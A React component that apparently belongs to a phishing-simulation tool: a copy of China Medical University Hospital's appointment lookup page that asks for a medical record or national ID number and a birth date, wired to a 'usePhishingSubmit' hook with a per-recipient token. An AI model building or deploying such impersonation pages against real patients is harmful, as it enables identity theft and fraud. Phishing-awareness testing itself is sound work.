"use client";

import { usePhishingSubmit } from "./usePhishingSubmit";

export default function CmuHospitalLogin({ token }: { token: string }) {
  const { loading, handleSubmit } = usePhishingSubmit(token);

  return (
    <div className="min-h-screen bg-white">
      {/* Top nav bar */}
      <div className="bg-[#005b96] text-white">
        <div className="max-w-[1100px] mx-auto px-4 py-3 flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center">
            <span className="text-[#005b96] text-xs font-bold">CMU</span>
          </div>
          <div>
            <div className="font-bold text-base">中國醫藥大學附設醫院</div>
            <div className="text-xs opacity-80">China Medical University Hospital</div>
          </div>
        </div>
      </div>

      <div className="max-w-[1100px] mx-auto px-4 py-6 flex flex-col lg:flex-row gap-6">
        {/* Left sidebar */}
        <div className="lg:w-[200px] shrink-0">
          <div className="bg-[#005b96] text-white rounded overflow-hidden">
            <div className="px-4 py-3 font-bold text-sm bg-[#004a7c]">就醫服務</div>
            {[
              "掛號服務",
              "門診時間表",
              "我要看哪一科",
              "急診及住院服務",
              "病歷與證明申請",
              "衛教專區",
              "轉診／代檢資訊",
              "就診權利宣言",
            ].map((item) => (
              <div
                key={item}
                className="px-4 py-2.5 text-sm border-t border-[#0069a8] hover:bg-[#0069a8] cursor-pointer"
              >
                {item}
              </div>
            ))}
          </div>
        </div>

        {/* Main content */}
        <div className="flex-1">
          <h1 className="text-[#005b96] text-xl font-bold mb-6 pb-3 border-b-2 border-[#005b96]">
            查詢或取消掛號
          </h1>

          <div className="text-sm text-[#666] mb-4">
            ※已完成預約掛號者不可更換當日現場號，請依看診號碼於診間插卡報到
          </div>

          {/* Query form */}
          <div className="bg-[#f0f7fa] border border-[#b8d4e3] rounded-lg p-6">
            <h2 className="text-[#005b96] font-bold text-base mb-4 pb-2 border-b border-[#b8d4e3]">
              掛號查詢或取消掛號 - 複診
            </h2>

            <form onSubmit={handleSubmit} className="space-y-5">
              <div>
                <label className="block text-sm text-[#333] mb-2 font-medium">
                  請輸入 病歷號或身份證字號
                </label>
                <input
                  type="text"
                  placeholder="請輸入病歷號或身份證字號"
                  className="w-full max-w-[400px] px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#005b96]"
                  autoComplete="off"
                />
              </div>

              <div>
                <label className="block text-sm text-[#333] mb-2 font-medium">
                  請輸入 生日
                </label>
                <div className="flex items-center gap-2">
                  <input
                    type="text"
                    placeholder="請輸入「年」"
                    className="w-[140px] px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#005b96]"
                    autoComplete="off"
                  />
                  <span className="text-sm text-[#666]">年</span>
                  <input
                    type="text"
                    placeholder="請輸入「月」"
                    className="w-[140px] px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#005b96]"
                    autoComplete="off"
                  />
                  <span className="text-sm text-[#666]">月</span>
                  <input
                    type="text"
                    placeholder="請輸入「日」"
                    className="w-[140px] px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#005b96]"
                    autoComplete="off"
                  />
                  <span className="text-sm text-[#666]">日</span>
                </div>
              </div>

              <div className="flex items-center gap-2">
                <input type="checkbox" id="cmu-captcha" />
                <label htmlFor="cmu-captcha" className="text-sm text-[#333]">
                  我不是機器人
                </label>
              </div>

              <div className="flex gap-3 pt-2">
                <button
                  type="submit"
                  disabled={loading}
                  className="bg-[#005b96] text-white px-6 py-2 rounded text-sm font-medium hover:bg-[#004a7c] transition-colors disabled:opacity-50"
                >
                  {loading ? "查詢中..." : "送出查詢"}
                </button>
                <button
                  type="button"
                  className="bg-[#6c757d] text-white px-6 py-2 rounded text-sm font-medium hover:bg-[#5a6268] transition-colors"
                >
                  清除資料
                </button>
              </div>
            </form>
          </div>

          <div className="mt-6 text-center">
            <a href="#" className="inline-block bg-[#005b96] text-white px-6 py-2 rounded text-sm hover:bg-[#004a7c]">
              回網路掛號
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
